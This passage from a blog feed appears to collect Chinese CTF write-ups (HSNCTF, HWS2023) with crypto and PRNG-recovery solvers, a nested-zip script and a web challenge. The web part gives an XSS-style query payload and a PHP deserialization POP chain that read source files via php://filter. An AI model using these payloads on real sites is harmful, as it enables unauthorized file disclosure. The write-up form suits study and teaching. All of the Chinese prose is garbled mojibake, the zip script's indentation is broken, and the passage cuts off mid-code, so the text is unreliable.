class="hljs-number">0x3</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xf</span>)<br>                forge(w, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x5</span>, <span class="hljs-number">0xa</span>, <span class="hljs-number">0xf</span>)<br>                forge(w, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x6</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xc</span>)<br>                forge(w, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0x8</span>, <span class="hljs-number">0xd</span>)<br>                forge(w, <span class="hljs-number">0x3</span>, <span class="hljs-number">0x4</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xe</span>)<br>            <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> pack(<span class="hljs-string">&#x27;&lt;16L&#x27;</span>, *((w[_] + bring[_]) &amp; <span class="hljs-number">0xffffffff</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>))):<br>                <span class="hljs-keyword">yield</span> c<br>            bring[<span class="hljs-number">12</span>] = (bring[<span class="hljs-number">12</span>] + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xffffffff</span><br>            <span class="hljs-keyword">if</span> bring[<span class="hljs-number">12</span>] == <span class="hljs-number">0</span>:<br>                bring[<span class="hljs-number">13</span>] = (bring[<span class="hljs-number">13</span>] + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xffffffff</span><br><br>key = <span class="hljs-string">&#x27;52f0907eca3ce05d8d0b6691bb8c8dbca19b63b7bcfcf033fc320f182b5ad610&#x27;</span><br>enc = <span class="hljs-string">&#x27;6d9b546c9f1f5e7116203933dabbf25e3a0e143122b20c27e5c83ea26b9d0dbb&#x27;</span><br><br>key, enc = <span class="hljs-built_in">map</span>(<span class="hljs-built_in">bytes</span>.fromhex, (key, enc))<br><br>key = (key * (<span class="hljs-number">32</span> // <span class="hljs-built_in">len</span>(key) + <span class="hljs-number">1</span>))[:<span class="hljs-number">32</span>]<br><br><span class="hljs-keyword">for</span> rand <span class="hljs-keyword">in</span> itertools.product(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>), repeat=<span class="hljs-number">2</span>):<br>    stream = AS(key)<br>    rand = <span class="hljs-built_in">bytes</span>(rand) * <span class="hljs-number">16</span><br>    passphrase = <span class="hljs-built_in">bytes</span>(a ^ b ^ c <span class="hljs-keyword">for</span> a, b, c <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(enc, stream.go(), rand))<br>    msg = <span class="hljs-built_in">bytes</span>(a ^ b <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(passphrase, key))<br>    <span class="hljs-keyword">if</span> (msg.startswith(<span class="hljs-string">b&#x27;HSNCTF&#123;&#x27;</span>)):<br>        <span class="hljs-built_in">print</span>(msg)<br>        <br><span class="hljs-comment">#HSNCTF&#123;91404a209e0f9ab7d245d5ee&#125;</span><br></code></pre></td></tr></table></figure><h2 id="brute-vigenere"><a href="#brute-vigenere" class="headerlink" title="brute_vigenere"></a>brute_vigenere</h2><p>å¯†ç è¡¨é‡Œå¤šäº†ä¸€å¯¹æ‹¬å·</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php">import <span class="hljs-keyword">string</span><br>import itertools<br><br>dicts = <span class="hljs-keyword">string</span>.ascii_lowercase +<span class="hljs-string">&quot;&#123;&#125;&quot;</span><br><span class="hljs-comment">#print(dicts)</span><br><span class="hljs-comment"># key = (&#x27;&#x27;.join([random.choice(dicts) for i in range(4)])) * 8</span><br>enc = <span class="hljs-string">&#x27;&#123;mvjk&#125;gbxyiutfchpm&#125;ylm&#125;a&#125;amuxlmg&#x27;</span><br><span class="hljs-keyword">for</span> k in itertools.<span class="hljs-title function_ invoke__">product</span>(dicts,repeat=<span class="hljs-number">4</span>):<br>    key = <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-title function_ invoke__">join</span>(k)<br>    <span class="hljs-comment"># print(key)</span><br>    numenc = [dicts.<span class="hljs-title function_ invoke__">index</span>(i) <span class="hljs-keyword">for</span> i in enc]<br>    numkey = [dicts.<span class="hljs-title function_ invoke__">index</span>(i) <span class="hljs-keyword">for</span> i in key]<br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-title function_ invoke__">len</span>(enc)):<br>        <span class="hljs-comment"># assert len(numenc) == len(numkey)</span><br>        ans = (numenc[i] - numkey[i % <span class="hljs-number">4</span>]) % <span class="hljs-number">28</span><br>        flag += dicts[ans]<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;hsnctf&#x27;</span> in flag:<br>        <span class="hljs-keyword">print</span>(flag)<br>        <span class="hljs-keyword">break</span><br>            <br><span class="hljs-comment">#hsnctf&#123;wecanalwaystrustvigenere&#125;</span><br></code></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="ç­¾åˆ°é¢˜"><a href="#ç­¾åˆ°é¢˜" class="headerlink" title="ç­¾åˆ°é¢˜"></a>ç­¾åˆ°é¢˜</h2><p>å…¬ä¼—å·å›å¤ç­¾åˆ°é¢˜å³å¯<br><code>hsnctf&#123;welcome_to_hsnctf&#125;</code></p><h2 id="extract"><a href="#extract" class="headerlink" title="extract"></a>extract</h2><p>æ ¹æ®<code>Cloakify.txt</code>åå­—çŸ¥é“æ˜¯Cloakifyéšå†™ ï¼š<a href="https://github.com/TryCatchHCF/Cloakify">https://github.com/TryCatchHCF/Cloakify</a><br>å¾—åˆ°ä¸€ä¸ªtxtæ–‡ä»¶  æ ¹æ®PKå¾—çŸ¥ä¸ºzipæ–‡ä»¶ æ”¹åç¼€ å‘ç°æ˜¯å‹ç¼©åŒ…å¥—å¨ƒ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> *<br><br>name = <span class="hljs-string">&#x27;f2332&#x27;</span><br>num = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    fz = zipfile.ZipFile(name + <span class="hljs-string">&#x27;.zip&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) Â  Â <span class="hljs-comment">#è¯»å–zipæ–‡ä»¶</span><br>password = name<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> fz.namelist(): Â  Â  Â  Â  <span class="hljs-comment">#éå†zipå†…æ–‡ä»¶å</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;zip&quot;</span> <span class="hljs-keyword">in</span> i: Â  Â  Â <span class="hljs-comment">#åˆ¤æ–­å½“å‰æ–‡ä»¶æ˜¯å¦æ˜¯zipæ–‡ä»¶</span><br>        newpassword = i[<span class="hljs-number">0</span>:-<span class="hljs-number">4</span>] Â  <span class="hljs-comment">#å‹ç¼©å¯†ç ä¸ºzipæ–‡ä»¶åï¼Œå–å‡º</span><br><span class="hljs-built_in">print</span>(newpassword)<br><span class="hljs-comment"># fz.extractall(pwd=bytes(password, &#x27;utf-8&#x27;)) Â  Â  Â  #æå–zipæ–‡ä»¶</span><br>fz.extractall()<br>num +=<span class="hljs-number">1</span><br>name = newpassword<br></code></pre></td></tr></table></figure><p>è§£å¼€å¥—å¨ƒä¹‹åå³å¯å¾—åˆ°flag<br><code>hsnctf&#123;66eec912-e9ce-4e1d-ac54-ecea075dcb96&#125;</code></p><h2 id="å¤–æ˜Ÿç”µæ³¢"><a href="#å¤–æ˜Ÿç”µæ³¢" class="headerlink" title="å¤–æ˜Ÿç”µæ³¢~"></a>å¤–æ˜Ÿç”µæ³¢~</h2><p><img src="/mdimg/2023sswk/2.png"><br>flag.txtæ¯”flag.rarå°å¾ˆå¤šæ€€ç–‘æœ‰å…¶ä»–æ–‡ä»¶ ä½†binwalkæ— æœ  åœ¨010å‘ç°hillstone.wav  Ntfséšå†™  å¯¼å‡ºwavæ–‡ä»¶<br><img src="/mdimg/2023sswk/3.png"><br>SSTVè§£å¯†<br><img src="/mdimg/2023sswk/4.png"><br>flag.txt   base64è½¬zipæ–‡ä»¶  è§£å‹å³å¯å¾—åˆ°flag<br><code> hsnctf&#123;70995fb0-eb60-0787-f305-77066aeb6730&#125;</code></p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Primitive-php"><a href="#Primitive-php" class="headerlink" title="Primitive php"></a>Primitive php</h2><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/cjdgg/article/details/115314651">https://blog.csdn.net/cjdgg/article/details/115314651</a><br>ç”¨Exceptionå’Œ<code>&lt;script&gt;alert(&quot;1&quot;)&lt;/script&gt;</code>ç»•è¿‡<br><code>payload:?class1=Exception&amp;a=&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;&amp;class2=Exception&amp;b=&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;&amp;class3=SplFileObject&amp;c=php://filter/convert.base64-encode/resource=hint.php</code><br>æ‹¿åˆ°æºç æ„é€ payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">blue</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b2</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$b1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;b1 = <span class="hljs-variable">$b1</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">red</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$r1</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$r1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;r1 = <span class="hljs-variable">$r1</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">white</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$w</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;w = <span class="hljs-variable">$w</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">color</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c1</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$c1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;c1 = <span class="hljs-variable">$c1</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-variable">$f</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">color</span>(<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>);  <br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">red</span>(<span class="hljs-variable">$f</span>);<br><span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">blue</span>(<span class="hljs-variable">$e</span>);<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">color</span>(<span class="hljs-variable">$d</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">white</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">red</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><h1 id="ICS"><a href="#ICS" class="headerlink" title="ICS"></a>ICS</h1><h2 id="S7-analysis"><a href="#S7-analysis" class="headerlink" title="S7_analysis"></a>S7_analysis</h2><p><img src="/mdimg/2023sswk/5.png"><br><code>hsnctf&#123;399&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HWS2023 å†¬ä»¤è¥</title>
    <link href="/2023/02/06/2023HWS/"/>
    <url>/2023/02/06/2023HWS/</url>
    
    <content type="html"><![CDATA[<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="math"><a href="#math" class="headerlink" title="math"></a>math</h2><p>é¢˜ç›®ä¿¡æ¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag,a,b<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> shuffle<br> <br>D = <span class="hljs-number">0x1337</span><br><span class="hljs-keyword">assert</span> a**<span class="hljs-number">2</span> - D*b**<span class="hljs-number">2</span> == <span class="hljs-number">1</span><br>m = bytes_to_long(flag)<br>p = getPrime(<span class="hljs-number">512</span>)<br>x = (a * m + b) % p<br>y=<span class="hljs-built_in">bin</span>(x)[<span class="hljs-number">2</span>:]<br>c=[y[i:i+<span class="hljs-number">85</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(y),<span class="hljs-number">85</span>)]<br>shuffle(c)<br><span class="hljs-built_in">print</span>(p)<br><span class="hljs-built_in">print</span>(c)<br> <br><span class="hljs-comment"># p=11199186558148426014734492874345932099384932524559726349180064588241518696390926354448476750322781683505497782040786332571272422812867731614415519029276349</span><br><span class="hljs-comment"># c=[&#x27;0010101111100011101101011111111001011000100110001001000000010001111011110101110011111&#x27;, &#x27;0011010010010010110010011011001100110001100010101110001010001101110001100000111011010&#x27;, &#x27;0110101101011101110000100001000000010001110110001010000000010110010101100100101110000&#x27;, &#x27;0100111001011010000101100111100110101100011100100111011000110001111101000110110101101&#x27;, &#x27;1100100110011101010011011111000101011011010000101100011001110100101000101101111110100&#x27;, &#x27;1110111110001110000101100000000100111010110000001111010001101001100001010110101010001&#x27;]</span><br></code></pre></td></tr></table></figure><p><strong>D = 0x1337 a2 - D*b2 == 1</strong><code>ä¸ºPellæ–¹ç¨‹ ç½‘ç«™åœ¨çº¿ï¼ˆ[http://www.numbertheory.org/php/pell.html](http://www.numbertheory.org/php/pell.html)ï¼‰è§£ä¸€ä¸‹ï¼Œå¾—åˆ°æ–¹ç¨‹aï¼Œbçš„æœ€å°æ•´æ•°è§£ </code>a = 1809338099956399320ï¼Œb = 25797719546469589</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> permutations<br><br>D = <span class="hljs-number">0x1337</span><br>a = [<span class="hljs-number">1809338099956399320</span>]<br>b = [<span class="hljs-number">25797719546469589</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>    a, b = a + [a[-<span class="hljs-number">1</span>] * a[<span class="hljs-number">0</span>] + D * b[-<span class="hljs-number">1</span>] * b[<span class="hljs-number">0</span>]], b + [a[-<span class="hljs-number">1</span>] * b[<span class="hljs-number">0</span>] + b[-<span class="hljs-number">1</span>] * a[<span class="hljs-number">0</span>]]<br><br>p=<span class="hljs-number">11199186558148426014734492874345932099384932524559726349180064588241518696390926354448476750322781683505497782040786332571272422812867731614415519029276349</span><br>c=[<span class="hljs-string">&#x27;0010101111100011101101011111111001011000100110001001000000010001111011110101110011111&#x27;</span>, <span class="hljs-string">&#x27;0011010010010010110010011011001100110001100010101110001010001101110001100000111011010&#x27;</span>, <span class="hljs-string">&#x27;0110101101011101110000100001000000010001110110001010000000010110010101100100101110000&#x27;</span>, <span class="hljs-string">&#x27;0100111001011010000101100111100110101100011100100111011000110001111101000110110101101&#x27;</span>, <span class="hljs-string">&#x27;1100100110011101010011011111000101011011010000101100011001110100101000101101111110100&#x27;</span>, <span class="hljs-string">&#x27;1110111110001110000101100000000100111010110000001111010001101001100001010110101010001&#x27;</span>]<br>res = [<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(res), <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> res <span class="hljs-keyword">in</span> permutations(c)]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    ai, bi = a[i], b[i]<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> res:<br>        m = (c - bi) * inverse(ai, p) % p<br>        flag = long_to_bytes(m)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>            <span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment">#b&#x27;flag&#123;5b80aaa2-2bb2-0ef1-4aa0-a5a9387239d5&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="Numbers-Game"><a href="#Numbers-Game" class="headerlink" title="Numbers Game"></a>Numbers Game</h2><p>é¢˜ç›®ä¸éš¾ï¼Œæ¯”èµ›çš„æ—¶å€™æ²¡æå‡ºæ¥å¾ˆéš¾å—å‘œå‘œå‘œ<br>MT19937è¿˜åŸï¼Œæ ¹æ®624ç»„32bitçš„æ•°æ®è¿˜åŸstateä¹‹åé€†æ¨ä¸Šä¸€ç»„stateè¿›è€Œå¾—åˆ°å‰12ä¸ª32bitçš„éšæœºæ•°å€¼ã€‚å‚è€ƒ: <a href="https://blog.csdn.net/zippo1234/article/details/109279944">https://blog.csdn.net/zippo1234/article/details/109279944</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> randcrack <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-comment"># right shift inverse</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_right</span>(<span class="hljs-params">res,shift,bits=<span class="hljs-number">32</span></span>):<br>    tmp = res<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits//shift):<br>        tmp = res ^ tmp &gt;&gt; shift<br>    <span class="hljs-keyword">return</span> tmp<br><br><span class="hljs-comment"># right shift with mask inverse</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_right_values</span>(<span class="hljs-params">res,shift,mask,bits=<span class="hljs-number">32</span></span>):<br>    tmp = res<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits//shift):<br>        tmp = res ^ tmp&gt;&gt;shift &amp; mask<br>    <span class="hljs-keyword">return</span> tmp<br><br><span class="hljs-comment"># left shift inverse</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_left</span>(<span class="hljs-params">res,shift,bits=<span class="hljs-number">32</span></span>):<br>    tmp = res<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits//shift):<br>        tmp = res ^ tmp &lt;&lt; shift<br>    <span class="hljs-keyword">return</span> tmp<br><br><span class="hljs-comment"># left shift with mask inverse</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_left_values</span>(<span class="hljs-params">res,shift,mask,bits=<span class="hljs-number">32</span></span>):<br>    tmp = res<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits//shift):<br>        tmp = res ^ tmp &lt;&lt; shift &amp; mask<br>    <span class="hljs-keyword">return</span> tmp<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backtrace</span>(<span class="hljs-params">cur</span>):<br>    high = <span class="hljs-number">0x80000000</span><br>    low = <span class="hljs-number">0x7fffffff</span><br>    mask = <span class="hljs-number">0x9908b0df</span><br>    state = cur<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>): <span class="hljs-comment">#é€†æ±‚çš„32bit ç»„æ•° æ­¤å¤„éœ€è¦é€†æ±‚12ç»„</span><br>        tmp = state[i+<span class="hljs-number">624</span>]^state[i+<span class="hljs-number">397</span>]<br>        <span class="hljs-comment"># recover Y,tmp = Y</span><br>        <span class="hljs-keyword">if</span> tmp &amp; high == high:<br>            tmp ^= mask<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>            tmp |= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tmp &lt;&lt;=<span class="hljs-number">1</span><br>        <span class="hljs-comment"># recover highest bit</span><br>        res = tmp&amp;high<br>        <span class="hljs-comment"># recover other 31 bits,when i =0,it just use the method again it so beautiful!!!!</span><br>        tmp = state[i-<span class="hljs-number">1</span>+<span class="hljs-number">624</span>]^state[i+<span class="hljs-number">396</span>]<br>        <span class="hljs-comment"># recover Y,tmp = Y</span><br>        <span class="hljs-keyword">if</span> tmp &amp; high == high:<br>            tmp ^= mask<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>            tmp |= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tmp &lt;&lt;=<span class="hljs-number">1</span><br>        res |= (tmp)&amp;low<br>        state[i] = res<br>    <span class="hljs-keyword">return</span> state<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recover_state</span>(<span class="hljs-params">out</span>):<br>    state = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> out:<br>        i = inverse_right(i,<span class="hljs-number">18</span>)<br>        i = 